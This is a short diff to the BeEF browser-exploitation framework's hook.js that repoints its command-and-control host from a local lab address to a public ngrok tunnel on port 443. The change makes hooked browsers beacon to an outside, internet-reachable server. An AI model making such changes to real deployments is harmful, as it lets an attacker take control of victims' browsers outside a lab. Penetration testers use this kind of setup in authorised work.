@@ -11713,8 +11713,8 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "192.168.1.146",
-    port: "3000",
+    host: "https://47a2-113-20-108-211.ap.ngrok.io",
+    port: "443",
     hook: "/hook.js",
     httpproto: "http",
     handler: '/dh',
